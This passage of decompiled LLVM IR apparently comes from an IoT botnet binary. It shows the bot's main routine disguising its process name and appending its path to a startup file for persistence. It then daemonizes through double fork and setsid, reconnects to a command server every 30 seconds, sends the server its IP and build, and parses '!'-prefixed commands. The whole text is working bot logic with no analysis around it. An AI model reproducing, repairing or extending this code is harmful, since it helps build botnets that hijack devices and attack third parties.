  %v2_11700 = icmp eq i32 %v4_116f8, 0
  br i1 %v2_11700, label %dec_label_pc_11748, label %dec_label_pc_11728.preheader

dec_label_pc_11728.preheader:                     ; preds = %dec_label_pc_116e4
  %v2_1172c9 = load i8, i8* %stack_var_-4168, align 1
  %v7_1173013 = icmp eq i8 %v2_1172c9, 9
  br i1 %v7_1173013, label %dec_label_pc_11738, label %dec_label_pc_1171c

dec_label_pc_1171c:                               ; preds = %dec_label_pc_11728.preheader, %dec_label_pc_1171c
  %v4_1172814 = phi i32 [ %v1_11720, %dec_label_pc_1171c ], [ %v2_1176c, %dec_label_pc_11728.preheader ]
  %v1_11720 = add i32 %v4_1172814, 1
  %v5_11724 = inttoptr i32 %v1_11720 to i8*
  %v2_1172c = load i8, i8* %v5_11724, align 1
  %v7_11730 = icmp eq i8 %v2_1172c, 9
  br i1 %v7_11730, label %dec_label_pc_11738, label %dec_label_pc_1171c

dec_label_pc_11738:                               ; preds = %dec_label_pc_1171c, %dec_label_pc_11728.preheader
  %storemerge3.lcssa = phi i8* [ %stack_var_-4168, %dec_label_pc_11728.preheader ], [ %v5_11724, %dec_label_pc_1171c ]
  store i8 0, i8* %storemerge3.lcssa, align 1
  br label %dec_label_pc_1178c

dec_label_pc_11748:                               ; preds = %dec_label_pc_116e4
  store i32 4096, i32* @r2, align 4
  %v3_11760 = call i32 @__GI_memset(i8* nonnull %stack_var_-4168, i32 0)
  br label %dec_label_pc_11764

dec_label_pc_11764:                               ; preds = %dec_label_pc_116c0, %dec_label_pc_11748
  %v4_1177c = call i32 @fdgets(i32 %v2_1176c, i32 4096, i32 %v3_116d4, i32 %v2_1176c)
  %v2_11784 = icmp eq i32 %v4_1177c, 0
  br i1 %v2_11784, label %dec_label_pc_1178c, label %dec_label_pc_116e4

dec_label_pc_1178c:                               ; preds = %dec_label_pc_11764, %dec_label_pc_11738
  %v1_11790 = call i32 @__GI_close(i32 %v3_116d4)
  %v4_117a0 = load i8, i8* %stack_var_-4168, align 1
  %v2_117a4 = icmp eq i8 %v4_117a0, 0
  br i1 %v2_117a4, label %dec_label_pc_1183c, label %dec_label_pc_117ac

dec_label_pc_117ac:                               ; preds = %dec_label_pc_1178c
  %v2_117b4 = ptrtoint i32* %stack_var_-4200 to i32
  store i32 %v2_1176c, i32* @r1, align 4
  %v2_117cc = bitcast i32* %stack_var_-4200 to i8*
  %v3_117cc = call i32 @strcpy(i8* %v2_117cc, i32 %v2_1176c)
  store i32 %v2_117b4, i32* @r3, align 4
  %v3_117ec = call i32 @ioctl(i32 %v3_115e4, i32 35111, i32 %v2_117b4)
  %v2_1180c = ptrtoint i32* %stack_var_-4182 to i32
  br label %dec_label_pc_117fc

dec_label_pc_117fc:                               ; preds = %dec_label_pc_117ac, %dec_label_pc_117fc
  %storemerge47 = phi i32 [ 0, %dec_label_pc_117ac ], [ %v1_11828, %dec_label_pc_117fc ]
  store i32 %storemerge47, i32* @r1, align 4
  %v2_11814 = add i32 %storemerge47, %v2_1180c
  %v1_11818 = inttoptr i32 %v2_11814 to i8*
  %v2_11818 = load i8, i8* %v1_11818, align 1
  %v4_11820 = add i32 %storemerge47, ptrtoint (i32* @global_var_299b0.769 to i32)
  %v5_11820 = inttoptr i32 %v4_11820 to i8*
  store i8 %v2_11818, i8* %v5_11820, align 1
  %v1_11828 = add nuw nsw i32 %storemerge47, 1
  %v7_11838 = icmp slt i32 %v1_11828, 6
  br i1 %v7_11838, label %dec_label_pc_117fc, label %dec_label_pc_1183c

dec_label_pc_1183c:                               ; preds = %dec_label_pc_117fc, %dec_label_pc_1178c
  %v1_11840 = call i32 @__GI_close(i32 %v3_115e4)
  %v3_1185c.pre = load i32, i32* %stack_var_-4208, align 4
  br label %dec_label_pc_11858

dec_label_pc_11848:                               ; preds = %dec_label_pc_116b0, %dec_label_pc_11670, %dec_label_pc_115fc
  store i32 0, i32* %stack_var_-4208, align 4
  br label %dec_label_pc_11858

dec_label_pc_11858:                               ; preds = %dec_label_pc_1183c, %dec_label_pc_11848
  %v3_1185c = phi i32 [ %v3_1185c.pre, %dec_label_pc_1183c ], [ 0, %dec_label_pc_11848 ]
  %v2_11864 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_11864, i32* @fp, align 4
  ret i32 %v3_1185c

; uselistorder directives
  uselistorder i32 %storemerge47, { 3, 1, 0, 2 }
  uselistorder i32 %v1_11720, { 1, 0 }
  uselistorder i32 %v2_1176c, { 2, 1, 3, 5, 0, 4 }
  uselistorder i32 %v3_115e4, { 1, 0, 2, 3, 4 }
  uselistorder i32* %stack_var_-4208, { 1, 0 }
  uselistorder i32* %stack_var_-52, { 1, 0, 2 }
  uselistorder i32* %stack_var_-72, { 1, 0 }
  uselistorder i8* %stack_var_-4168, { 4, 2, 0, 1, 3 }
  uselistorder i32 %tmp19, { 1, 0 }
  uselistorder i8 9, { 1, 0, 2 }
  uselistorder i32 (i32)* @__GI_htons, { 10, 9, 8, 7, 6, 5, 4, 11, 3, 2, 1, 0 }
  uselistorder i32 53, { 0, 2, 1 }
  uselistorder i32 (i32)* @inet_addr, { 2, 1, 0 }
  uselistorder label %dec_label_pc_11858, { 1, 0 }
  uselistorder label %dec_label_pc_117fc, { 1, 0 }
  uselistorder label %dec_label_pc_11764, { 1, 0 }
  uselistorder label %dec_label_pc_1171c, { 1, 0 }
}

define i32 @getBuild() local_unnamed_addr {
entry:
  %stack_var_0 = alloca i32, align 4
  %v1_11880 = ptrtoint i32* %stack_var_0 to i32
  store i32 %v1_11880, i32* @ip, align 4
  ret i32 ptrtoint ([6 x i8]* @global_var_1fcfc.771 to i32)
}

define i32 @main(i32 %argc, i8** %argv) local_unnamed_addr {
entry:
  %stack_var_-5744 = alloca i32, align 4
  %stack_var_-112 = alloca i32, align 4
  %stack_var_-1648 = alloca i32, align 4
  %stack_var_-624 = alloca i32, align 4
  %stack_var_-368 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %v3_118a8 = load i32, i32* @r4, align 4
  store i32 %v3_118a8, i32* %stack_var_-24, align 4
  store i32 71856, i32* %stack_var_-4, align 4
  %v19_118a8 = ptrtoint i32* %stack_var_-24 to i32
  %v2_118ac = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_118ac, i32* @fp, align 4
  %v1_118f0 = bitcast i8** %argv to i32*
  %v2_118f0 = load i32, i32* %v1_118f0, align 4
  store i32 %v2_118f0, i32* @r4, align 4
  %v2_11908 = load i32, i32* %v1_118f0, align 4
  %v1_1190c = inttoptr i32 %v2_11908 to i8*
  %v3_11910 = call i32 @strlen(i8* %v1_1190c)
  %v0_11918 = load i32, i32* @r4, align 4
  store i32 ptrtoint (i32* @global_var_1fd04.773 to i32), i32* @r1, align 4
  %v3_11924 = call i32 @strncpy(i32 %v0_11918, i32 ptrtoint (i32* @global_var_1fd04.773 to i32), i32 %v3_11910)
  store i32 ptrtoint (i32* @global_var_1fd04.773 to i32), i32* %v1_118f0, align 4
  %v5_11960 = call i32 @prctl(i32 15, i32 ptrtoint (i32* @global_var_1fd04.773 to i32), i32 0, i32 0, i32 0)
  %v2_11968 = call i32 @__GI_time(i32* null)
  store i32 %v2_11968, i32* @r0, align 4
  store i32 %v2_11968, i32* @r4, align 4
  %v0_11970 = call i32 @__GI_getpid()
  %v0_11978 = load i32, i32* @r4, align 4
  %v2_11978 = xor i32 %v0_11978, %v0_11970
  %v1_11980 = call i32 @srand(i32 %v2_11978)
  %v2_11988 = call i32 @__GI_time(i32* null)
  store i32 %v2_11988, i32* @r0, align 4
  store i32 %v2_11988, i32* @r4, align 4
  %v0_11990 = call i32 @__GI_getpid()
  %v0_11998 = load i32, i32* @r4, align 4
  %v2_11998 = xor i32 %v0_11998, %v0_11990
  %v1_119a0 = call i32 @init_rand(i32 %v2_11998)
  store i32 ptrtoint ([19 x i8]* @global_var_1fd08.775 to i32), i32* @r0, align 4
  store i32 ptrtoint ([2 x i8]* @global_var_1fd1c.777 to i32), i32* @r1, align 4
  %v3_119bc = call i32 @__GI_fopen(i32 ptrtoint ([19 x i8]* @global_var_1fd08.775 to i32), i32 ptrtoint ([2 x i8]* @global_var_1fd1c.777 to i32))
  %v2_119cc = icmp eq i32 %v3_119bc, 0
  br i1 %v2_119cc, label %dec_label_pc_119d4, label %dec_label_pc_119f0

dec_label_pc_119d4:                               ; preds = %entry
  store i32 ptrtoint ([13 x i8]* @global_var_1fd20.779 to i32), i32* @r0, align 4
  store i32 ptrtoint ([2 x i8]* @global_var_1fd1c.777 to i32), i32* @r1, align 4
  %v3_119e4 = call i32 @__GI_fopen(i32 ptrtoint ([13 x i8]* @global_var_1fd20.779 to i32), i32 ptrtoint ([2 x i8]* @global_var_1fd1c.777 to i32))
  br label %dec_label_pc_119f0

dec_label_pc_119f0:                               ; preds = %entry, %dec_label_pc_119d4
  %stack_var_-88.0 = phi i32 [ %v3_119e4, %dec_label_pc_119d4 ], [ %v3_119bc, %entry ]
  %stack_var_-92.0 = phi i8* [ getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_1fd20.779, i32 0, i32 0), %dec_label_pc_119d4 ], [ getelementptr inbounds ([19 x i8], [19 x i8]* @global_var_1fd08.775, i32 0, i32 0), %entry ]
  %v2_119f4 = icmp eq i32 %stack_var_-88.0, 0
  br i1 %v2_119f4, label %dec_label_pc_11b8c, label %dec_label_pc_119fc

dec_label_pc_119fc:                               ; preds = %dec_label_pc_119f0
  %v2_11a0c = load i32, i32* %v1_118f0, align 4
  %v1_11a10 = inttoptr i32 %v2_11a0c to i8*
  %v3_11a14 = call i32 @strlen(i8* %v1_11a10)
  %v2_11a28 = ptrtoint i32* %stack_var_-368 to i32
  %v2_11a34 = call i32 @getcwd(i32 %v2_11a28, i32 256)
  store i32 ptrtoint (i32* @global_var_1fd30.781 to i32), i32* @r1, align 4
  %v2_11a44 = bitcast i32* %stack_var_-368 to i8*
  %v3_11a44 = call i32 @__GI_strcoll(i8* %v2_11a44, i32 ptrtoint (i32* @global_var_1fd30.781 to i32))
  %v2_11a4c = icmp eq i32 %v3_11a44, 0
  br i1 %v2_11a4c, label %dec_label_pc_11b84, label %dec_label_pc_11a64

dec_label_pc_11a58:                               ; preds = %dec_label_pc_11a64
  %v1_11a5c = add i32 %stack_var_-84.0, -1
  br label %dec_label_pc_11a64

dec_label_pc_11a64:                               ; preds = %dec_label_pc_119fc, %dec_label_pc_11a58
  %stack_var_-84.0 = phi i32 [ %v1_11a5c, %dec_label_pc_11a58 ], [ %v3_11a14, %dec_label_pc_119fc ]
  %v2_11a74 = load i32, i32* %v1_118f0, align 4
  %v2_11a7c = add i32 %v2_11a74, %stack_var_-84.0
  %v1_11a80 = inttoptr i32 %v2_11a7c to i8*
  %v2_11a80 = load i8, i8* %v1_11a80, align 1
  %v7_11a84 = icmp eq i8 %v2_11a80, 47
  br i1 %v7_11a84, label %dec_label_pc_11a8c, label %dec_label_pc_11a58

dec_label_pc_11a8c:                               ; preds = %dec_label_pc_11a64
  %v2_11a9c = load i32, i32* %v1_118f0, align 4
  %v2_11aa4 = add i32 %v2_11a9c, %stack_var_-84.0
  %v2_11aa8 = ptrtoint i32* %stack_var_-624 to i32
  store i32 %v2_11aa8, i32* @r0, align 4
  %v8_11abc = call i32 @sprintf(i32 %v2_11aa8, i32 ptrtoint ([8 x i8]* @global_var_1fd34.783 to i32), i32 %v2_11a28, i32 %v2_11aa4, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  %v1_11b18 = inttoptr i32 %stack_var_-88.0 to i16*
  %v2_11acc = ptrtoint i32* %stack_var_-1648 to i32
  %v2_11af8 = bitcast i32* %stack_var_-1648 to i8*
  br label %dec_label_pc_11b14.outer

dec_label_pc_11ac4:                               ; preds = %dec_label_pc_11b14
  %v3_11adc = call i32 @fgets(i32 %v2_11acc, i32 1024, i32 %stack_var_-88.0)
  %v3_11af8 = call i32 @__GI_strcasecmp(i8* %v2_11af8, i32 %v2_11aa8)
  %v2_11b00 = icmp eq i32 %v3_11af8, 0
  br i1 %v2_11b00, label %dec_label_pc_11b08, label %dec_label_pc_11b14

dec_label_pc_11b08:                               ; preds = %dec_label_pc_11ac4
  %v1_11b0c = add i32 %stack_var_-80.0.ph, 1
  br label %dec_label_pc_11b14.outer

dec_label_pc_11b14.outer:                         ; preds = %dec_label_pc_11b08, %dec_label_pc_11a8c
  %stack_var_-80.0.ph = phi i32 [ %v1_11b0c, %dec_label_pc_11b08 ], [ 0, %dec_label_pc_11a8c ]
  br label %dec_label_pc_11b14

dec_label_pc_11b14:                               ; preds = %dec_label_pc_11b14.outer, %dec_label_pc_11ac4
  %v2_11b18 = call i32 @feof(i16* %v1_11b18)
  %v2_11b20 = icmp eq i32 %v2_11b18, 0
  br i1 %v2_11b20, label %dec_label_pc_11ac4, label %dec_label_pc_11b28

dec_label_pc_11b28:                               ; preds = %dec_label_pc_11b14
  %v2_11b2c = icmp eq i32 %stack_var_-80.0.ph, 0
  %v2_11b38 = call i32 @__GI_fclose(i16* %v1_11b18)
  br i1 %v2_11b2c, label %dec_label_pc_11b34, label %dec_label_pc_11b8c

dec_label_pc_11b34:                               ; preds = %dec_label_pc_11b28
  %v4_11b3c = ptrtoint i8* %stack_var_-92.0 to i32
  store i32 %v4_11b3c, i32* @r0, align 4
  store i32 ptrtoint (i32* @global_var_1fd3c.785 to i32), i32* @r1, align 4
  %v3_11b44 = call i32 @__GI_fopen(i32 %v4_11b3c, i32 ptrtoint (i32* @global_var_1fd3c.785 to i32))
  %v2_11b54 = icmp eq i32 %v3_11b44, 0
  br i1 %v2_11b54, label %dec_label_pc_11b8c, label %dec_label_pc_11b5c

dec_label_pc_11b5c:                               ; preds = %dec_label_pc_11b34
  %v2_11b68 = call i32 @__GI_fputs(i32 %v2_11aa8, i32 %v3_11b44)
  %v1_11b70 = inttoptr i32 %v3_11b44 to i16*
  %v2_11b70 = call i32 @__GI_fclose(i16* %v1_11b70)
  br label %dec_label_pc_11b8c

dec_label_pc_11b84:                               ; preds = %dec_label_pc_119fc
  %v1_11b88 = inttoptr i32 %stack_var_-88.0 to i16*
  %v2_11b88 = call i32 @__GI_fclose(i16* %v1_11b88)
  br label %dec_label_pc_11b8c

dec_label_pc_11b8c:                               ; preds = %dec_label_pc_11b28, %dec_label_pc_11b34, %dec_label_pc_119f0, %dec_label_pc_11b5c, %dec_label_pc_11b84
  %v0_11b8c = call i32 @getOurIP()
  store i32 %v0_11b8c, i32* @r0, align 4
  %v0_11b90 = call i32 @__libc_fork()
  store i32 %v0_11b90, i32* @r0, align 4
  %v2_11ba0 = icmp eq i32 %v0_11b90, 0
  br i1 %v2_11ba0, label %dec_label_pc_11bd0, label %dec_label_pc_11c0c

dec_label_pc_11bd0:                               ; preds = %dec_label_pc_11b8c
  %v0_11bd0 = call i32 @__libc_fork()
  store i32 %v0_11bd0, i32* @r0, align 4
  %v2_11be0 = icmp eq i32 %v0_11bd0, 0
  br i1 %v2_11be0, label %dec_label_pc_11bf0.thread, label %dec_label_pc_11bfc

dec_label_pc_11bf0.thread:                        ; preds = %dec_label_pc_11bd0
  br label %dec_label_pc_11c18

dec_label_pc_11bfc:                               ; preds = %dec_label_pc_11bd0
  %v1_11bec = call i32 @__GI_exit(i32 0)
  %v2_11c04 = call i32 @zprintf(i32 ptrtoint ([13 x i8]* @global_var_1fd40.787 to i32))
  store i32 %v2_11c04, i32* @r0, align 4
  br label %dec_label_pc_11c18

dec_label_pc_11c0c:                               ; preds = %dec_label_pc_11b8c
  %v2_11ba8 = ptrtoint i32* %stack_var_-112 to i32
  store i32 %v0_11b90, i32* @r0, align 4
  store i32 %v2_11ba8, i32* @r1, align 4
  %v3_11bb8 = call i32 @__libc_waitpid(i32 %v0_11b90, i32 %v2_11ba8, i32 0)
  %v1_11bc0 = call i32 @__GI_exit(i32 0)
  %v2_11c14 = call i32 @zprintf(i32 ptrtoint ([13 x i8]* @global_var_1fd40.787 to i32))
  store i32 %v2_11c14, i32* @r0, align 4
  br label %dec_label_pc_11c18

dec_label_pc_11c18:                               ; preds = %dec_label_pc_11bf0.thread, %dec_label_pc_11bfc, %dec_label_pc_11c0c
  %v0_11c18 = call i32 @__GI_setsid()
  %v1_11c20 = call i32 @chdir(i32 ptrtoint (i32* @global_var_1fd30.781 to i32))
  %v2_11c2c = call i32 @bsd_signal(i32 13, i32 1)
  %v2_124c0 = ptrtoint i32* %stack_var_-5744 to i32
  %v4_124d0 = bitcast i32* %stack_var_-5744 to i8*
  %v2_1222c = ptrtoint i32* %stack_var_-1648 to i32
  %v2_1223c = bitcast i32* %stack_var_-1648 to i8*
  %v1_120bc = or i32 %v2_124c0, 1
  %v5_120c0 = inttoptr i32 %v1_120bc to i8*
  %v2_12390 = add i32 %v19_118a8, -600
  br label %dec_label_pc_11c30.outer

dec_label_pc_11c30.outer:                         ; preds = %dec_label_pc_12014, %dec_label_pc_124b0, %dec_label_pc_11c18
  %stack_var_-96.0.ph19 = phi i32 [ 0, %dec_label_pc_11c18 ], [ %stack_var_-96.2.ph, %dec_label_pc_124b0 ], [ %v1_12018, %dec_label_pc_12014 ]
  %v0_11c3024 = call i32 @initConnection()
  %v2_11c3826 = icmp eq i32 %v0_11c3024, 0
  br i1 %v2_11c3826, label %dec_label_pc_11c4c, label %dec_label_pc_11c40

dec_label_pc_11c40:                               ; preds = %dec_label_pc_11c30.outer, %dec_label_pc_11c40
  %v1_11c44 = call i32 @sleep(i32 30)
  %v0_11c30 = call i32 @initConnection()
  %v2_11c38 = icmp eq i32 %v0_11c30, 0
  br i1 %v2_11c38, label %dec_label_pc_11c4c, label %dec_label_pc_11c40

dec_label_pc_11c4c:                               ; preds = %dec_label_pc_11c40, %dec_label_pc_11c30.outer
  %v2_11c50 = load i32, i32* @global_var_299a0.50, align 4
  store i32 %v2_11c50, i32* @r4, align 4
  %v0_11c54 = call i32 @getBuild()
  store i32 %v0_11c54, i32* @r5, align 4
  %v2_11c60 = load i32, i32* @global_var_2fbfc.475, align 4
  store i32 %v2_11c60, i32* @r0, align 4
  %v1_11c64 = call i32 @__GI_inet_ntoa(i32 %v2_11c60)
  %v0_11c6c = load i32, i32* @r4, align 4
  %v0_11c74 = load i32, i32* @r5, align 4
  store i32 %v0_11c74, i32* @r2, align 4
  %v3_11c78 = call i32 @sockprintf(i32 %v0_11c6c, i32 ptrtoint ([12 x i8]* @global_var_1fd50.791 to i32))
  br label %dec_label_pc_124b0.outer

dec_label_pc_11c9c:                               ; preds = %dec_label_pc_11f50, %dec_label_pc_11efc
  %v3_11ca0 = mul i32 %v3_11f44, 4
  %v2_11cac = load i32, i32* @global_var_2fc08.71, align 4
  %v2_11cb0 = add i32 %v2_11cac, %v3_11ca0
  %v1_11cb4 = inttoptr i32 %v2_11cb0 to i32*
  %v2_11cb4 = load i32, i32* %v1_11cb4, align 4
  store i32 %v2_11cb4, i32* @r0, align 4
  store i32 0, i32* @r1, align 4
  %v3_11cc4 = call i32 @__libc_waitpid(i32 %v2_11cb4, i32 0, i32 1)
  %tmp111 = icmp slt i32 %v3_11cc4, 1
  br i1 %tmp111, label %dec_label_pc_11ef0, label %dec_label_pc_11d28

dec_label_pc_11ce4:                               ; preds = %dec_label_pc_11d84, %dec_label_pc_11d28
  %v2_11ce8 = load i32, i32* @global_var_2fc08.71, align 4
  %v3_11cf4 = mul i32 %v1_11cd8, 4
  %v1_11cec = add i32 %v3_11cf4, -4
  %v2_11cf8 = add i32 %v1_11cec, %v2_11ce8
  %v2_11d10 = add i32 %v2_11ce8, %v3_11cf4
  %v1_11d14 = inttoptr i32 %v2_11d10 to i32*
  %v2_11d14 = load i32, i32* %v1_11d14, align 4
  %v2_11d18 = inttoptr i32 %v2_11cf8 to i32*
  store i32 %v2_11d14, i32* %v2_11d18, align 4
  br label %dec_label_pc_11d28

dec_label_pc_11d28:                               ; preds = %dec_label_pc_11c9c, %dec_label_pc_11ce4
  %v3_11cd4.sink = phi i32 [ %v1_11cd8, %dec_label_pc_11ce4 ], [ %v3_11f44, %dec_label_pc_11c9c ]
  %v1_11cd8 = add i32 %v3_11cd4.sink, 1
  %v2_11d44 = load i32, i32* @global_var_299a8.68, align 4
  %v5_11d44 = load i32, i32* @global_var_299ac.69, align 4
  %tmp112 = icmp ugt i32 %v5_11d44, %v1_11cd8
  br i1 %tmp112, label %dec_label_pc_11ce4, label %dec_label_pc_11d6c

dec_label_pc_11d6c:                               ; preds = %dec_label_pc_11d28
  %v9_11d7c = icmp eq i32 %v5_11d44, %v1_11cd8
  br i1 %v9_11d7c, label %dec_label_pc_11d84, label %dec_label_pc_11d9c

dec_label_pc_11d84:                               ; preds = %dec_label_pc_11d6c
  %v9_11d94 = icmp eq i32 %v2_11d44, 0
  br i1 %v9_11d94, label %dec_label_pc_11d9c, label %dec_label_pc_11ce4

dec_label_pc_11d9c:                               ; preds = %dec_label_pc_11d84, %dec_label_pc_11d6c
  %v2_11da0 = load i32, i32* @global_var_2fc08.71, align 4
  %v3_11dac = mul i32 %v1_11cd8, 4
  %v1_11da4 = add i32 %v3_11dac, -4
  %v2_11db0 = add i32 %v1_11da4, %v2_11da0
  %v2_11db8 = inttoptr i32 %v2_11db0 to i32*
  store i32 0, i32* %v2_11db8, align 4
  %v2_11dc0 = load i32, i32* @global_var_299a8.68, align 4
  %v5_11dc0 = load i32, i32* @global_var_299ac.69, align 4
  %v2_11dcc = add i32 %v2_11dc0, -1
  %v3_11dcc = icmp ne i32 %v2_11dc0, 0
  %v3_11dd0 = add i32 %v5_11dc0, -1
  %v4_11dd0 = zext i1 %v3_11dcc to i32
  %v5_11dd0 = add i32 %v3_11dd0, %v4_11dd0
  store i32 %v2_11dcc, i32* @global_var_299a8.68, align 4
  store i32 %v5_11dd0, i32* @global_var_299ac.69, align 4
  %v3_11dec = icmp eq i32 %v2_11dc0, 0
  %v4_11df0 = zext i1 %v3_11dec to i32
  %v5_11df0 = add i32 %v5_11dd0, %v4_11df0
  %v3_11df4 = udiv i32 %v2_11dc0, 1073741824
  %v3_11df8 = mul i32 %v5_11df0, 4
  %v2_11dfc = or i32 %v3_11df8, %v3_11df4
  store i32 %v2_11dfc, i32* @r4, align 4
  %v3_11e00 = mul i32 %v2_11dc0, 4
  %v1_11e08 = call i32 @malloc(i32 %v3_11e00)
  br label %dec_label_pc_11e60

dec_label_pc_11e20:                               ; preds = %dec_label_pc_11ebc, %dec_label_pc_11e60
  %v3_11e24 = mul i32 %v3_11eb0, 4
  %v2_11e30 = add i32 %v3_11e24, %v1_11e08
  %v2_11e44 = load i32, i32* @global_var_2fc08.71, align 4
  %v2_11e48 = add i32 %v2_11e44, %v3_11e24
  %v1_11e4c = inttoptr i32 %v2_11e48 to i32*
  %v2_11e4c = load i32, i32* %v1_11e4c, align 4
  %v2_11e50 = inttoptr i32 %v2_11e30 to i32*
  store i32 %v2_11e4c, i32* %v2_11e50, align 4
  %v1_11e58 = add i32 %v3_11eb0, 1
  br label %dec_label_pc_11e60

dec_label_pc_11e60:                               ; preds = %dec_label_pc_11d9c, %dec_label_pc_11e20
  %v3_11eb0 = phi i32 [ 0, %dec_label_pc_11d9c ], [ %v1_11e58, %dec_label_pc_11e20 ]
  %v2_11e7c = load i32, i32* @global_var_299a8.68, align 4
  %v5_11e7c = load i32, i32* @global_var_299ac.69, align 4
  %tmp114 = icmp ugt i32 %v5_11e7c, %v3_11eb0
  br i1 %tmp114, label %dec_label_pc_11e20, label %dec_label_pc_11ea4

dec_label_pc_11ea4:                               ; preds = %dec_label_pc_11e60
  %v9_11eb4 = icmp eq i32 %v5_11e7c, %v3_11eb0
  br i1 %v9_11eb4, label %dec_label_pc_11ebc, label %dec_label_pc_11ed4

dec_label_pc_11ebc:                               ; preds = %dec_label_pc_11ea4
  %v9_11ecc = icmp eq i32 %v2_11e7c, 0
  br i1 %v9_11ecc, label %dec_label_pc_11ed4, label %dec_label_pc_11e20

dec_label_pc_11ed4:                               ; preds = %dec_label_pc_11ebc, %dec_label_pc_11ea4
  %v2_11ed8 = load i32, i32* @global_var_2fc08.71, align 4
  store i32 %v2_11ed8, i32* @r0, align 4
  %v0_11ee0 = call i32 @free()
  store i32 %v1_11e08, i32* @global_var_2fc08.71, align 4
  br label %dec_label_pc_11ef0

dec_label_pc_11ef0:                               ; preds = %dec_label_pc_11c9c, %dec_label_pc_11ed4
  %v1_11ef4 = add i32 %v3_11f44, 1
  br label %dec_label_pc_11efc

dec_label_pc_11efc:                               ; preds = %dec_label_pc_124b0, %dec_label_pc_11ef0
  %v3_11f44 = phi i32 [ %v1_11ef4, %dec_label_pc_11ef0 ], [ 0, %dec_label_pc_124b0 ]
  %v3_11f04 = ashr i32 %v3_11f44, 31
  %v2_11f14 = load i32, i32* @global_var_299a8.68, align 4
  %v5_11f14 = load i32, i32* @global_var_299ac.69, align 4
  %v3_11f30 = icmp uge i32 %v5_11f14, %v3_11f44
  %v9_11f30 = icmp eq i32 %v5_11f14, %v3_11f44
  %v2_11f34 = xor i1 %v9_11f30, true
  %v3_11f34 = and i1 %v3_11f30, %v2_11f34
  br i1 %v3_11f34, label %dec_label_pc_11c9c, label %dec_label_pc_11f38

dec_label_pc_11f38:                               ; preds = %dec_label_pc_11efc
  br i1 %v9_11f30, label %dec_label_pc_11f50, label %dec_label_pc_11f68

dec_label_pc_11f50:                               ; preds = %dec_label_pc_11f38
  %tmp = icmp ugt i32 %v2_11f14, %v3_11f04
  br i1 %tmp, label %dec_label_pc_11c9c, label %dec_label_pc_11f68

dec_label_pc_11f68:                               ; preds = %dec_label_pc_11f38, %dec_label_pc_11f50
  %v2_11f7c = add i32 %v5_124d0, %v2_124c0
  %v3_11f84 = inttoptr i32 %v2_11f7c to i8*
  store i8 0, i8* %v3_11f84, align 1
  %v2_11f98 = call i32 @trim(i8* %v4_124d0)
  %v4_11fb0 = call i32 @strstr(i32 %v2_124c0, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1e93c.52, i32 0, i32 0))
  store i32 %v4_11fb0, i32* @r2, align 4
  %v9_11fc4 = icmp eq i32 %v4_11fb0, %v2_124c0
  br i1 %v9_11fc4, label %dec_label_pc_11fcc, label %dec_label_pc_11fe4

dec_label_pc_11fcc:                               ; preds = %dec_label_pc_11f68
  %v2_11fd0 = load i32, i32* @global_var_299a0.50, align 4
  %v3_11fdc = call i32 @sockprintf(i32 %v2_11fd0, i32 ptrtoint ([5 x i8]* @global_var_1fd5c.796 to i32))
  br label %dec_label_pc_124b0

dec_label_pc_11fe4:                               ; preds = %dec_label_pc_11f68
  %v6_11ff8 = call i32 @strstr(i32 %v2_124c0, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_1fd64.798, i32 0, i32 0))
  %v9_1200c = icmp eq i32 %v6_11ff8, %v2_124c0
  br i1 %v9_1200c, label %dec_label_pc_12014, label %dec_label_pc_12040

dec_label_pc_12014:                               ; preds = %dec_label_pc_11fe4
  %v1_12018 = add i32 %stack_var_-96.2.ph, 1
  %v2_12028 = call i32 @zprintf(i32 ptrtoint ([20 x i8]* @global_var_1fd68.800 to i32))
  %v7_12034 = icmp slt i32 %v1_12018, 21
  br i1 %v7_12034, label %dec_label_pc_11c30.outer, label %dec_label_pc_12038

dec_label_pc_12038:                               ; preds = %dec_label_pc_12014
  %v1_1203c = call i32 @__GI_exit(i32 0)
  br label %dec_label_pc_12040

dec_label_pc_12040:                               ; preds = %dec_label_pc_11fe4, %dec_label_pc_12038
  %stack_var_-96.1 = phi i32 [ %v1_12018, %dec_label_pc_12038 ], [ %stack_var_-96.2.ph, %dec_label_pc_11fe4 ]
  %v2_12054 = load i8, i8* %v4_124d0, align 4
  %v7_12058 = icmp eq i8 %v2_12054, 33
  br i1 %v7_12058, label %dec_label_pc_1207c, label %dec_label_pc_124b0.outer

dec_label_pc_1207c:                               ; preds = %dec_label_pc_12040, %dec_label_pc_1208c
  %v3_12060.sink = phi i8* [ %storemerge8, %dec_label_pc_1208c ], [ %v4_124d0, %dec_label_pc_12040 ]
  %v4_12060 = ptrtoint i8* %v3_12060.sink to i32
  %v1_12064 = add i32 %v4_12060, 1
  %storemerge8 = inttoptr i32 %v1_12064 to i8*
  %v2_12080 = load i8, i8* %storemerge8, align 1
  %v7_12084 = icmp eq i8 %v2_12080, 32
  br i1 %v7_12084, label %dec_label_pc_1209c, label %dec_label_pc_1208c

dec_label_pc_1208c:                               ; preds = %dec_label_pc_1207c
  %v2_12090 = load i8, i8* %storemerge8, align 1
  %v2_12094 = icmp eq i8 %v2_12090, 0
  br i1 %v2_12094, label %dec_label_pc_1209c, label %dec_label_pc_1207c

dec_label_pc_1209c:                               ; preds = %dec_label_pc_1208c, %dec_label_pc_1207c
  %v2_120a0 = load i8, i8* %storemerge8, align 1
  %v2_120a4 = icmp eq i8 %v2_120a0, 0
  br i1 %v2_120a4, label %dec_label_pc_124b0.outer, label %dec_label_pc_120ac

dec_label_pc_120ac:                               ; preds = %dec_label_pc_1209c
  store i8 0, i8* %storemerge8, align 1
  %v3_120cc = call i32 @strlen(i8* %v5_120c0)
  %v2_120dc = add i32 %v3_120cc, %v2_124c0
  %v1_120e0 = add i32 %v2_120dc, 2
  %v5_120e4 = inttoptr i32 %v1_120e0 to i8*
  %v1_12114 = add i32 %v2_120dc, 1
  br label %dec_label_pc_12110

dec_label_pc_120ec:                               ; preds = %dec_label_pc_12138, %dec_label_pc_12110
  %v3_120fc = call i32 @strlen(i8* %v5_120e4)
  %v2_12104 = add i32 %v1_12114, %v3_120fc
  %v3_1210c = inttoptr i32 %v2_12104 to i8*
  store i8 0, i8* %v3_1210c, align 1
  br label %dec_label_pc_12110

